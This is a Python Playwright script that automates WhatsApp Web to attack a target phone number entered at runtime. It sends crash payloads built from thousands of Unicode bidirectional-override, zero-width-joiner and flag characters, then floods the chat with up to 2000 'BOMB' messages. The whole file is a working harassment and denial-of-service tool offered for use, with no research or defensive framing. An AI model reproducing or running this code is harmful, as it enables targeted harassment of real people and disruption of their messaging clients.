#!/usr/bin/env python3
import asyncio
import random
from playwright.async_api import async_playwright

class WAPlaywrightExploit:
    def __init__(self):
        self.browser = None
        self.page = None
        self.context = None
        
    async def start(self):
        p = await async_playwright().start()
        self.browser = await p.chromium.launch_persistent_context(
            './wa_playwright_session',
            headless=False,
            args=['--no-sandbox']
        )
        self.page = await self.browser.new_page()
        await self.page.goto('https://web.whatsapp.com')
        return self.page
    
    async def wait_login(self):
        await self.page.wait_for_selector('div[data-testid="chat-list"]', timeout=60000)
        print("[+] Login success!")
    
    async def open_chat(self, number):
        if not number.startswith('+'):
            number = '+' + number
            
        await self.page.click('div[data-testid="new-chat"]')
        await self.page.fill('div[data-testid="chat-list-search"] input', number)
        await asyncio.sleep(2)
        await self.page.click(f'span[title="{number}"]')
    
    async def send_message(self, msg):
        box = await self.page.wait_for_selector('div[data-testid="conversation-compose-box"] div[contenteditable="true"]')
        await box.fill(msg)
        await box.press('Enter')
    
    async def crash_exploit(self):
        payloads = [
            "‮⁩⁦⁭⁮⁯" * 1000,
            "\u202E\u202D\u2066\u2067" * 500,
            "‍" * 20000,
            "🇦" * 3000,
        ]
        
        for p in payloads:
            await self.send_message(p)
            await asyncio.sleep(0.05)
    
    async def fast_bomb(self, count=2000):
        tasks = []
        for i in range(count):
            tasks.append(self.send_message(f"💣 BOMB {i+1}"))
            if len(tasks) >= 50:
                await asyncio.gather(*tasks)
                tasks = []
            await asyncio.sleep(0.01)
        
        if tasks:
            await asyncio.gather(*tasks)
    
    async def run(self, target, mode="all"):
        await self.open_chat(target)
        await asyncio.sleep(2)
        
        if mode == "crash":
            await self.crash_exploit()
        elif mode == "bomb":
            await self.fast_bomb()
        else:
            await self.crash_exploit()
            await self.fast_bomb(1000)
        
        print("[+] Exploit done!")

async def main():
    wa = WAPlaywrightExploit()
    await wa.start()
    await wa.wait_login()
    
    target = input("Target number: ")
    mode = input("Mode (crash/bomb/all): ")
    
    await wa.run(target, mode)

if __name__ == "__main__":
    asyncio.run(main())